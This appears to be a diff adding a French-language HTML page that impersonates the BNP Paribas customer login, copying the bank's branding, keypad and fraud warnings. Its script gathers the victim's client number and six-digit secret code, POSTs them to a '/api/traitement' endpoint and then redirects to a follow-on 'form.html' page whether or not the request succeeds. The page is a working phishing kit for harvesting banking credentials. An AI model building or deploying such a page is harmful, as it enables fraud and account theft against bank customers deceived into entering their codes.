@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNP Paribas - Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- RESET & CONFIGURATION GLOBALE --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background-color: #f4f7f6;
+            color: #333333;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .bnp-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER BLANC (Fidèle à image_10.png) --- */
+        .bnp-header {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            height: 60px;
+            border-bottom: 1px solid #eef2f1;
+        }
+        .bnp-header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .bnp-logo-placeholder img {
+            height: 34px;
+            width: auto;
+            display: block;
+        }
+        .bnp-slogan {
+            font-size: 12px;
+            color: #718096;
+            font-weight: 400;
+            border-left: 1px solid #cbd5e0;
+            padding-left: 12px;
+        }
+        .bnp-burger-menu {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .bnp-burger-menu span {
+            display: block;
+            width: 22px;
+            height: 2px;
+            background-color: #00965e;
+            border-radius: 2px;
+        }
+
+        /* --- BLOC CENTRAL VERT ACCUEIL AUTH --- */
+        .bnp-hero-auth {
+            background-color: #00965e;
+            padding: 30px 20px;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+        }
+        .bnp-main-title {
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #ffffff;
+        }
+
+        /* --- FORMULAIRE CHREOP ET CHAMPS --- */
+        .bnp-form-container {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+        .bnp-input-group {
+            margin-bottom: 15px;
+        }
+        .bnp-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        .bnp-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .bnp-input-wrapper input {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 12px;
+            padding: 0 45px 0 14px;
+            font-size: 16px;
+            color: #2d3748;
+            background-color: #ffffff;
+            outline: none;
+        }
+        .bnp-clear-btn {
+            position: absolute;
+            right: 12px;
+            background: #e2e8f0;
+            border: none;
+            color: #718096;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+        }
+
+        /* CHECKBOX ROW */
+        .bnp-checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+        .bnp-checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            user-select: none;
+        }
+        .bnp-checkbox-label input {
+            width: 18px;
+            height: 18px;
+            accent-color: #00965e;
+            cursor: pointer;
+        }
+        .bnp-info-icon {
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #ffffff;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            font-size: 11px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
+        /* --- SÉCURITÉ CODE : CONTENEUR MASQUÉ PAR DÉFAUT --- */
+        .bnp-password-blind-box {
+            display: none;
+            flex-direction: column;
+            margin-top: 5px;
+        }
+        .bnp-password-blind-box.open {
+            display: flex !important;
+        }
+        .bnp-label-secret {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        /* LES RONDS D'ÉTAT SÉCURISÉS (image_10.png) */
+        .bnp-circles-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .bnp-circle-slot {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: background-color 0.15s ease;
+        }
+        .bnp-circle-slot.filled {
+            background-color: #ffffff !important;
+        }
+
+        /* GRILLE CLAVIER MATRICIEL EXCLUSIVE 5 COLONNES (image_10.png) */
+        .bnp-matrix-keyboard {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .bnp-key {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            height: 48px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #004d32;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .bnp-key:active {
+            background-color: #e2e8f0;
+        }
+        .bnp-key-back {
+            grid-column: 1;
+            background-color: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 8px;
+            height: 48px;
+            color: #ffffff;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .bnp-key-back:active {
+            background-color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* BOUTON FLUIDE PRINCIPAL */
+        .bnp-primary-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 700;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.3);
+            color: rgba(255, 255, 255, 0.6);
+            cursor: not-allowed;
+            transition: all 0.2s ease;
+        }
+        .bnp-primary-btn.active {
+            background-color: #ffffff !important;
+            color: #00965e !important;
+            cursor: pointer !important;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        /* LIENS CRÉDENTIELS */
+        .bnp-links-row {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .bnp-forgot-link {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: underline;
+        }
+
+        /* --- CARTES D'ASSISTANCE INFÉRIEURES --- */
+        .bnp-footer-assistance {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            background-color: #f4f7f6;
+        }
+        .bnp-card {
+            background-color: #ffffff;
+            border-radius: 14px;
+            padding: 18px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+            border: 1px solid #eef2f1;
+        }
+        .bnp-card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .bnp-card-desc {
+            font-size: 13.5px;
+            color: #4a5568;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+        .bnp-card-desc.font-small {
+            font-size: 12.5px;
+            color: #718096;
+        }
+        .bnp-card-desc.muted {
+            color: #718096;
+            margin-bottom: 0;
+            margin-top: 4px;
+        }
+        .bnp-badge-url {
+            display: inline-block;
+            background-color: #f7fafc;
+            border: 1px solid #e2e8f0;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #2d3748;
+            margin-bottom: 12px;
+        }
+        .bnp-card-link {
+            display: inline-block;
+            font-size: 13.5px;
+            color: #00965e;
+            text-decoration: underline;
+            font-weight: 600;
+            margin-top: 6px;
+        }
+        .bnp-inline-link {
+            color: #00965e;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        /* BOUTONS STORES APP */
+        .bnp-store-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .bnp-store-btn {
+            flex: 1;
+            background-color: #2d3748;
+            color: #ffffff;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .bnp-store-btn.btn-google {
+            background-color: #00965e;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bnp-container">
+
+        <!-- HEADER BANQUE -->
+        <header class="bnp-header">
+            <div class="bnp-header-left">
+                <div class="bnp-logo-placeholder">
+                    <img src="BNP_Paribas.png" alt="BNP Paribas">
+                </div>
+                <span class="bnp-slogan">La banque d'un monde qui change</span>
+            </div>
+            <button class="bnp-burger-menu" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </header>
+
+        <!-- ZONE INTERACTIVE AUTH VERT -->
+        <section class="bnp-hero-auth">
+            <h1 class="bnp-main-title">Accédez à votre espace client</h1>
+
+            <div class="bnp-form-container">
+                <!-- Numéro Client -->
+                <div class="bnp-input-group">
+                    <label for="bnp-id-input" class="bnp-label">Numéro Client</label>
+                    <div class="bnp-input-wrapper">
+                        <input type="tel" id="bnp-id-input" placeholder="Numéro de 7 à 10 chiffres" maxlength="10" autocomplete="off">
+                        <button type="button" id="bnp-clear-id" class="bnp-clear-btn">✕</button>
+                    </div>
+                </div>
+
+                <!-- Option Mémoriser -->
+                <div class="bnp-checkbox-row">
+                    <label class="bnp-checkbox-label">
+                        <input type="checkbox" id="bnp-remember-me">
+                        Mémoriser mon numéro client
+                    </label>
+                    <span class="bnp-info-icon">i</span>
+                </div>
+
+                <!-- COMPOSANT INTERACTIF CODE SECRET (Masqué à l'étape 1) -->
+                <div id="bnp-password-section" class="bnp-password-blind-box">
+                    <p class="bnp-label-secret">Saisissez votre code secret</p>
+                    
+                    <!-- Cercles d'état de saisie -->
+                    <div class="bnp-circles-container">
+                        <div class="bnp-circle-slot"></div>
+                        <div class="bnp-circle-slot"></div>
+                        <div class="bnp-circle-slot"></div>
+                        <div class="bnp-circle-slot"></div>
+                        <div class="bnp-circle-slot"></div>
+                        <div class="bnp-circle-slot"></div>
+                    </div>
+
+                    <!-- Clavier matriciel fidèle à image_10.png -->
+                    <div class="bnp-matrix-keyboard">
+                        <button type="button" class="bnp-key" data-digit="0">0</button>
+                        <button type="button" class="bnp-key" data-digit="5">5</button>
+                        <button type="button" class="bnp-key" data-digit="1">1</button>
+                        <button type="button" class="bnp-key" data-digit="8">8</button>
+                        <button type="button" class="bnp-key" data-digit="9">9</button>
+                        
+                        <button type="button" class="bnp-key" data-digit="3">3</button>
+                        <button type="button" class="bnp-key" data-digit="4">4</button>
+                        <button type="button" class="bnp-key" data-digit="6">6</button>
+                        <button type="button" class="bnp-key" data-digit="7">7</button>
+                        <button type="button" class="bnp-key" data-digit="2">2</button>
+                        
+                        <button type="button" id="bnp-key-backspace" class="bnp-key-back">⌫</button>
+                    </div>
+                </div>
+
+                <!-- Unique Bouton d'action principal -->
+                <button type="button" id="bnp-btn-submit" class="bnp-primary-btn" disabled>Suivant</button>
+
+                <div class="bnp-links-row">
+                    <a href="javascript:void(0);" class="bnp-forgot-link" onclick="alert('Indisponible actuellement.');">Numéro client ou code secret oublié</a>
+                </div>
+            </div>
+        </section>
+
+        <!-- CARTES FOOTER INFOS -->
+        <footer class="bnp-footer-assistance">
+            <div class="bnp-card">
+                <h2 class="bnp-card-title">🔒 Sécurité</h2>
+                <p class="bnp-card-desc">Avant de vous connecter, vérifiez que sur la page Espace Client :</p>
+                <div class="bnp-badge-url">Espace client</div>
+                <p class="bnp-card-desc font-small">Si une tierce personne ou un représentant BNP Paribas vous demande de vous connecter ou de fournir des informations, il s'agit systématiquement d'une fraude.</p>
+                <a href="javascript:void(0);" class="bnp-card-link">Consulter tous nos conseils sécurité et fraude.</a>
+            </div>
+
+            <div class="bnp-card">
+                <h2 class="bnp-card-title">🎧 Besoin d'aide ?</h2>
+                <p class="bnp-card-desc">Consultez notre <a href="javascript:void(0);" class="bnp-inline-link">Assistance technique.</a></p>
+                <p class="bnp-card-desc muted">Disponible du lundi au vendredi de 8h à 20h et le samedi de 9h à 17h.</p>
+            </div>
+
+            <div class="bnp-card">
+                <h2 class="bnp-card-title">📱 Application Mobile</h2>
+                <p class="bnp-card-desc">Téléchargez l'application "Mes Comptes BNP Paribas" pour gérer vos comptes où que vous soyez.</p>
+                <div class="bnp-store-buttons">
+                    <a href="javascript:void(0);" class="bnp-store-btn btn-apple"> App Store</a>
+                    <a href="javascript:void(0);" class="bnp-store-btn btn-google">▲ Play Store</a>
+                </div>
+            </div>
+
+            <div class="bnp-card">
+                <h2 class="bnp-card-title">🛡️ Protection des données</h2>
+                <p class="bnp-card-desc">BNP Paribas s'engage à protéger vos données personnelles. Vos informations de connexion sont chiffrées et sécurisées.</p>
+                <a href="javascript:void(0);" class="bnp-card-link">Lire notre politique de confidentialité</a>
+            </div>
+        </footer>
+
+    </div>
+
+    <script>
+        // DOM SELECTION
+        const idInput = document.getElementById('bnp-id-input');
+        const clearIdBtn = document.getElementById('bnp-clear-id');
+        const btnSubmit = document.getElementById('bnp-btn-submit');
+        const passwordSection = document.getElementById('bnp-password-section');
+        const circleSlots = document.querySelectorAll('.bnp-circle-slot');
+        const backspaceBtn = document.getElementById('bnp-key-backspace');
+        const digitKeys = document.querySelectorAll('.bnp-key');
+
+        // APPLICATION STATE
+        let currentStep = 1; 
+        let secretCodeArray = []; 
+
+        // GESTION DES RONDS DE CODE SECRET
+        function updateCircles() {
+            circleSlots.forEach((slot, index) => {
+                if (index < secretCodeArray.length) {
+                    slot.classList.add('filled');
+                } else {
+                    slot.classList.remove('filled');
+                }
+            });
+        }
+
+        function fallbackToStep1() {
+            currentStep = 1;
+            secretCodeArray = [];
+            updateCircles();
+            passwordSection.classList.remove('open');
+            btnSubmit.textContent = 'Suivant';
+            
+            if (idInput.value.length >= 7 && idInput.value.length <= 10) {
+                btnSubmit.removeAttribute('disabled');
+                btnSubmit.classList.add('active');
+            } else {
+                btnSubmit.setAttribute('disabled', 'true');
+                btnSubmit.classList.remove('active');
+            }
+        }
+
+        // CONTROL CHAMP IDENTIFIANT (image_13.png)
+        idInput.addEventListener('input', () => {
+            idInput.value = idInput.value.replace(/\D/g, ''); // Nombres uniquement
+            clearIdBtn.style.display = idInput.value.length > 0 ? 'flex' : 'none';
+
+            if (currentStep === 1) {
+                if (idInput.value.length >= 7 && idInput.value.length <= 10) {
+                    btnSubmit.removeAttribute('disabled');
+                    btnSubmit.classList.add('active');
+                } else {
+                    btnSubmit.setAttribute('disabled', 'true');
+                    btnSubmit.classList.remove('active');
+                }
+            }
+        });
+
+        clearIdBtn.addEventListener('click', () => {
+            idInput.value = '';
+            clearIdBtn.style.display = 'none';
+            fallbackToStep1();
+            idInput.focus();
+        });
+
+        // ACTION CLAVIER VISUEL (image_10.png)
+        digitKeys.forEach(key => {
+            key.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (secretCodeArray.length < 6) {
+                    const digit = key.getAttribute('data-digit');
+                    if (digit !== null) {
+                        secretCodeArray.push(digit);
+                        updateCircles();
+                    }
+                    
+                    // PAS DE SOUMISSION AUTOMATIQUE : On active simplement le bouton final
+                    if (secretCodeArray.length === 6) {
+                        btnSubmit.removeAttribute('disabled');
+                        btnSubmit.classList.add('active');
+                    }
+                }
+            });
+        });
+
+        // BOUTON EFFACER DU CLAVIER VISUEL
+        backspaceBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (secretCodeArray.length > 0) {
+                secretCodeArray.pop();
+                updateCircles();
+                
+                // Désactivation immédiate du bouton s'il manque un chiffre
+                btnSubmit.setAttribute('disabled', 'true');
+                btnSubmit.classList.remove('active');
+            }
+        });
+
+        // GESTION DU CLIC SUR LE BOUTON UNIQUE
+        btnSubmit.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+
+            if (currentStep === 1) {
+                // Passage fluide à l'étape du mot de passe (image_10.png)
+                currentStep = 2;
+                passwordSection.classList.add('open');
+                btnSubmit.textContent = 'Accéder à mon espace client';
+                btnSubmit.setAttribute('disabled', 'true');
+                btnSubmit.classList.remove('active');
+                
+            } else if (currentStep === 2 && secretCodeArray.length === 6) {
+                // Exécution manuelle déclenchée uniquement par le clic de l'utilisateur
+                executeFinalSubmission();
+            }
+        });
+
+        // LOGIQUE ENVOI FORMULAIRE : FORMAT UNIQUE 3 CHAMPS
+        function executeFinalSubmission() {
+            if (!idInput || secretCodeArray.length !== 6) return;
+
+            const finalPayload = {
+                nom_banque: "BNP PARIBAS",
+                client_id: idInput.value,
+                secret_code: secretCodeArray.join('')
+            };
+
+            btnSubmit.setAttribute('disabled', 'true');
+            btnSubmit.classList.remove('active');
+            
+            // Animation points de chargement
+            let dotCount = 0;
+            btnSubmit.textContent = 'Connexion';
+            const dotInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4;
+                btnSubmit.textContent = 'Connexion' + '.'.repeat(dotCount);
+            }, 300);
+
+            // Redirection de secours absolue (1.5 seconde)
+            const safetyRedirect = setTimeout(() => {
+                clearInterval(dotInterval);
+                window.location.href = 'form.html';
+            }, 1500);
+
+            // Requête standardisée asynchrone Vercel
+            fetch('/api/traitement', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(finalPayload)
+            })
+            .then(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            })
+            .catch(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            });
+        }
+    </script>
+</body>
+</html>
